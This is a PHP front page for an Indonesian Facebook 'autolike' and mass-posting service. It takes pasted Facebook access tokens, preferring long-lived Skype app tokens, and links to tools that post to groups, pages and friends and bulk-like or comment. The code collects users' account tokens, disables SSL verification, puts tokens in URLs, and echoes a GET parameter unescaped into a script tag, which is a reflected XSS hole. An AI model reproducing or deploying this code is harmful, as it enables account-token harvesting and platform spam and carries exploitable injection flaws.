<?php
#-----------------------------------------------------#
# Script dasarnya oleh : Lans dan Baretyas
# Diedit oleh Pubiway
# Jangan pernah jual belikan script ini
# Sekian dan terima kasih :D
# Facebook : http://facebook.com/djsooch
#-----------------------------------------------------#
?><?php
session_start();
// JSONURL //
function get_html($url) {
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_FAILONERROR, 0);
    $data = curl_exec($ch);
    curl_close($ch);
	return $data;
    }
function get_json($url) {
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_FAILONERROR, 0);
    $data = curl_exec($ch);
    curl_close($ch);
	return json_decode($data);
    }
if($_SESSION['token']){
	$token = $_SESSION['token'];
	$graph_url ="https://graph.facebook.co.id/me?access_token=" . $token;
	$user = get_json($graph_url);
	if ($user->error) {
		if ($user->error->type== "OAuthException") {
			session_destroy();
			header('Location: index.php?i=Access token anda telah kadaluarsa, ambil token yang baru kembali');
			}
		}
}	
if(isset($_POST['submit'])) {
	$token2 = $_POST['token'];
	if(preg_match("'access_token=(.*?)&expires_in='", $token2, $matches)){
		$token = $matches[1];
			}
	else{
		$token = $token2;
	}
		$extend = get_html("https://graph.facebook.co.id/me/permissions?access_token="  . $token);
		$pos = strpos($extend, "publish_stream");
		if ($pos == true) {
		$_SESSION['token'] = $token;
			}
			else {
			session_destroy();
					header('Location: index.php?i=gunakan token SKYPE brow biar awet');}
		
		}else{}
if(isset($_POST['logout'])) {
session_destroy();
header('Location: index.php?i=Terimakasih Atas kunjunganya, token anda berhasil terhapus');
}
if(isset($_GET['i'])){
echo '<script type="text/javascript">alert("INFO:  ' . $_GET['i'] . '");</script>';
}

?>



<?php

$access_token = $_SESSION['token'];
//Mantap wa...
$user = json_decode(file_get_contents('https://graph.facebook.co.id/me?access_token='.$access_token));
?>
<html>
<body>
<?php include'../header.php'; ?>
<?php
if (!$access_token){
echo '<div class="menu"><font color="white" size="5">ANDA BELUM MASUK!</font><br>Silahkan <a href="/">MASUK </a>terlebih dahulu</div>';
} else { ?>




<div id="bottom-content">
<div id="navigation-menu"><h3><a name="navigation-menu"
class="no-link">Autolike</a></h3>
<ul>
<li><a href="http://fliker.cf">FLIKER</a></li>
<li><a href="http://fb-likess.ml">FB-LIkESS</a></li></ul></div>


<div id="navigation-menu"><h3><a name="navigation-menu"
class="no-link">Multy Post</a></h3>
<ul>
<li><a href="multy_groups.php?token=<?php echo $access_token; ?>&id=<?php echo $user->id; ?>">To Groups</a>
</li>
<li><a href="multy_pages.php?token=<?php echo $access_token; ?>&id=<?php echo $user->id; ?>">To Pages</a>
</li>
<li><a href="multy_friends.php?token=<?php echo $access_token; ?>&id=<?php echo $user->id; ?>">To Friends</a>
</li>
</ul>
</div>



<div id="navigation-menu"><h3><a name="navigation-menu"
class="no-link">Other</a></h3>
<ul>
<li><a href="likecom.php?token=<?php echo $access_token; ?>&id=<?php echo $user->id; ?>">100 post like & comment in one click</a>
</li>
<li><a href="wall.php?access_token=<?php echo $access_token; ?>">Post wall</a>
</li>
<li><a href="place.php?token=<?php echo $access_token; ?>&nama=<?php echo $user->name; ?>&id=<?php echo $user->id; ?>">Daftar Masuk+Tag Teman</a>
</li>
</ul>
</div>

</div>







<?php } ?>
<?php include'../footer.php'; ?>
</body>
</html>